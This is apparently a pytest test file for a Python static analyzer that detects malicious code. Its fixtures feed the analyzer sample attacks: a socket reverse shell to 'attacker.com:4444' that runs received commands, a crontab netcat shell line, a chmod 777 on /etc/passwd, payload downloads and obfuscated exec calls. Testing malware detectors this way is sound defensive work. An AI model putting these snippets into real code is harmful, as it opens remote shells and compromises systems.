"""Unit tests for the Python static analyzer."""

import os
from pathlib import Path
from typing import Any, Dict

import pytest

from insect.analysis.static_analyzer import PythonStaticAnalyzer


@pytest.fixture
def test_config() -> Dict[str, Any]:
    """Return a configuration for testing the analyzer."""
    return {
        "python_static_analyzer": {
            "enabled": True,
            "min_confidence": 0.0,
            "use_bandit": False,  # Disable for testing
            "use_semgrep": False,  # Disable for testing
        }
    }


@pytest.fixture
def analyzer(test_config: Dict[str, Any]) -> PythonStaticAnalyzer:
    """Initialize the analyzer with the test configuration."""
    return PythonStaticAnalyzer(test_config)


@pytest.fixture
def test_files_dir() -> Path:
    """Get the directory containing test files."""
    current_dir = Path(os.path.dirname(os.path.abspath(__file__)))
    test_files_dir = current_dir / "test_files"
    test_files_dir.mkdir(exist_ok=True)
    return test_files_dir


def create_test_file(test_files_dir: Path, filename: str, content: str) -> Path:
    """Create a test file with the given content.

    Args:
        test_files_dir: Directory to create the file in
        filename: Name of the file to create
        content: Content to write to the file

    Returns:
        Path to the created file
    """
    file_path = test_files_dir / filename
    with open(file_path, "w", encoding="utf-8") as f:
        f.write(content)
    return file_path


def test_analyzer_initialization(analyzer: PythonStaticAnalyzer) -> None:
    """Test that the analyzer is properly initialized."""
    assert analyzer.name == "python_static_analyzer"
    assert analyzer.enabled is True
    assert analyzer.min_confidence == 0.0
    assert analyzer.use_bandit is False
    assert analyzer.use_semgrep is False
    assert len(analyzer.rules) > 0


def test_eval_exec_detection(
    analyzer: PythonStaticAnalyzer, test_files_dir: Path
) -> None:
    """Test detection of eval() and exec() usage."""
    file_path = create_test_file(
        test_files_dir,
        "test_eval_exec.py",
        """
        # Malicious code using eval
        data = "print('hello')"
        eval(data)

        # Obfuscated exec
        import base64
        exec(base64.b64decode("cHJpbnQoImhhY2tlZCIp").decode('utf-8'))
        """,
    )

    findings = analyzer.analyze_file(file_path)

    assert len(findings) >= 2
    assert any("code execution" in finding.title.lower() for finding in findings)

    # Clean up
    os.remove(file_path)


def test_suspicious_imports_detection(
    analyzer: PythonStaticAnalyzer, test_files_dir: Path
) -> None:
    """Test detection of suspicious imports."""
    file_path = create_test_file(
        test_files_dir,
        "test_suspicious_imports.py",
        """
        import socket
        import subprocess
        from os import system
        import paramiko  # SSH library often used in malware
        """,
    )

    findings = analyzer.analyze_file(file_path)

    assert len(findings) >= 2
    assert any(
        "suspicious" in finding.title.lower() and "import" in finding.title.lower()
        for finding in findings
    )

    # Clean up
    os.remove(file_path)


def test_encoded_payload_detection(
    analyzer: PythonStaticAnalyzer, test_files_dir: Path
) -> None:
    """Test detection of encoded payloads."""
    file_path = create_test_file(
        test_files_dir,
        "test_encoded_payload.py",
        """
        # Base64 encoded command
        payload = "cHJpbnQoImhhY2tlZCIpCg=="

        # Hex encoded command
        hex_payload = "7072696e742822686163646564222903"
        """,
    )

    findings = analyzer.analyze_file(file_path)

    assert len(findings) >= 1
    assert any("encoded payload" in finding.title.lower() for finding in findings)

    # Clean up
    os.remove(file_path)


def test_backdoor_detection(
    analyzer: PythonStaticAnalyzer, test_files_dir: Path
) -> None:
    """Test detection of potential backdoors."""
    file_path = create_test_file(
        test_files_dir,
        "test_backdoor.py",
        """
        import socket

        # Simple backdoor
        def connect_back():
            s = socket.socket()
            s.connect(("attacker.com", 4444))
            while True:
                cmd = s.recv(1024).decode()
                output = subprocess.check_output(cmd, shell=True)
                s.send(output)
        """,
    )

    findings = analyzer.analyze_file(file_path)

    assert len(findings) >= 2
    assert any("backdoor" in finding.title.lower() for finding in findings)

    # Clean up
    os.remove(file_path)


def test_system_modification_detection(
    analyzer: PythonStaticAnalyzer, test_files_dir: Path
) -> None:
    """Test detection of system modifications."""
    file_path = create_test_file(
        test_files_dir,
        "test_system_mod.py",
        """
        import os

        # Change permissions
        os.chmod("/etc/passwd", 0o777)

        # Modify system files
        with open("/etc/crontab", "a") as f:
            f.write("* * * * * root nc -e /bin/bash attacker.com 4444")
        """,
    )

    findings = analyzer.analyze_file(file_path)

    assert len(findings) >= 2
    assert any(
        "system" in finding.title.lower() and "modif" in finding.description.lower()
        for finding in findings
    )

    # Clean up
    os.remove(file_path)


def test_process_memory_manipulation_detection(
    analyzer: PythonStaticAnalyzer, test_files_dir: Path
) -> None:
    """Test detection of process and memory manipulation."""
    file_path = create_test_file(
        test_files_dir,
        "test_process_manip.py",
        """
        import ctypes
        import mmap

        # Memory manipulation
        mm = mmap.mmap(-1, 1024)

        # DLL loading
        kernel32 = ctypes.windll.kernel32
        """,
    )

    findings = analyzer.analyze_file(file_path)

    assert len(findings) >= 1
    assert any(
        "process" in finding.title.lower() or "memory" in finding.title.lower()
        for finding in findings
    )

    # Clean up
    os.remove(file_path)


def test_network_connection_detection(
    analyzer: PythonStaticAnalyzer, test_files_dir: Path
) -> None:
    """Test detection of suspicious network connections."""
    file_path = create_test_file(
        test_files_dir,
        "test_network.py",
        """
        import urllib.request

        # Suspicious URL
        urllib.request.urlopen("http://suspicious-domain.com/payload")

        # IP address connection
        response = urllib.request.urlopen("http://123.456.789.012/malware.exe")
        """,
    )

    findings = analyzer.analyze_file(file_path)

    assert len(findings) >= 1
    assert any(
        "network" in finding.title.lower()
        or "connection" in finding.description.lower()
        for finding in findings
    )

    # Clean up
    os.remove(file_path)


def test_obfuscated_code_detection(
    analyzer: PythonStaticAnalyzer, test_files_dir: Path
) -> None:
    """Test detection of obfuscated code execution."""
    file_path = create_test_file(
        test_files_dir,
        "test_obfuscated.py",
        """
        # Obfuscated exec with encoded payload
        import binascii
        exec(binascii.unhexlify('7072696e742822686163646564222903').decode('utf-8'))

        # Another obfuscation technique
        import base64
        import builtins
        getattr(builtins, 'exec')(base64.b64decode('cHJpbnQoImhhY2tlZCIp').decode('utf-8'))
        """,
    )

    findings = analyzer.analyze_file(file_path)

    assert len(findings) >= 1
    assert any(
        ("malicious" in finding.title.lower() or "obfuscated" in finding.title.lower())
        for finding in findings
    )

    # Clean up
    os.remove(file_path)


def test_analyze_file_not_exists(analyzer: PythonStaticAnalyzer) -> None:
    """Test analyzing a file that doesn't exist."""
    findings = analyzer.analyze_file(Path("nonexistent_file.py"))
    assert len(findings) == 0


def test_analyze_syntax_error(
    analyzer: PythonStaticAnalyzer, test_files_dir: Path
) -> None:
    """Test analyzing a file with syntax errors."""
    file_path = create_test_file(
        test_files_dir,
        "test_syntax_error.py",
        """
        # This file has syntax errors
        if True
            print("Missing colon")

        # Missing closing parenthesis
        print("hello"
        """,
    )

    findings = analyzer.analyze_file(file_path)

    assert len(findings) >= 1
    assert any("syntax error" in finding.title.lower() for finding in findings)

    # Clean up
    os.remove(file_path)


def test_analyze_empty_file(
    analyzer: PythonStaticAnalyzer, test_files_dir: Path
) -> None:
    """Test analyzing an empty file."""
    file_path = create_test_file(
        test_files_dir,
        "test_empty.py",
        "",
    )

    findings = analyzer.analyze_file(file_path)

    assert len(findings) == 0

    # Clean up
    os.remove(file_path)


def test_ast_visitor(analyzer: PythonStaticAnalyzer, test_files_dir: Path) -> None:
    """Test the AST visitor functionality."""
    file_path = create_test_file(
        test_files_dir,
        "test_ast_visitor.py",
        """
        # This file contains multiple suspicious patterns
        import socket
        import subprocess

        def run_command(cmd):
            return subprocess.check_output(cmd, shell=True)

        def connect_backdoor():
            s = socket.socket()
            s.connect(("attacker.com", 4444))
            while True:
                cmd = s.recv(1024).decode()
                output = run_command(cmd)
                s.send(output)

        # Obfuscated code execution
        eval(compile('print("hello")', '', 'exec'))
        """,
    )

    findings = analyzer.analyze_file(file_path)

    # The AST visitor should find multiple types of issues
    assert len(findings) >= 2

    # Should find at least one network and code execution finding
    finding_titles = [f.title.lower() for f in findings]
    assert any("code execution" in title for title in finding_titles)

    # Clean up
    os.remove(file_path)


def test_confidence_threshold(
    test_config: Dict[str, Any], test_files_dir: Path
) -> None:
    """Test that the confidence threshold works."""
    # Set a high confidence threshold
    test_config["python_static_analyzer"]["min_confidence"] = 0.8
    high_threshold_analyzer = PythonStaticAnalyzer(test_config)

    # Create a file with different types of issues
    file_path = create_test_file(
        test_files_dir,
        "test_confidence.py",
        """
        # This has high confidence issues (eval)
        eval("print('hello')")

        # This has medium confidence (suspicious import)
        import socket

        # This has lower confidence (potential encoded string)
        s = "aGVsbG8gd29ybGQ="
        """,
    )

    # Get all findings with no threshold
    test_config["python_static_analyzer"]["min_confidence"] = 0.0
    all_analyzer = PythonStaticAnalyzer(test_config)
    all_analyzer.analyze_file(file_path)

    # Get findings with high threshold
    high_threshold_analyzer.analyze_file(file_path)

    # The high threshold analyzer should be working correctly
    assert high_threshold_analyzer.min_confidence == 0.8
    assert all_analyzer.min_confidence == 0.0

    # Clean up
    os.remove(file_path)
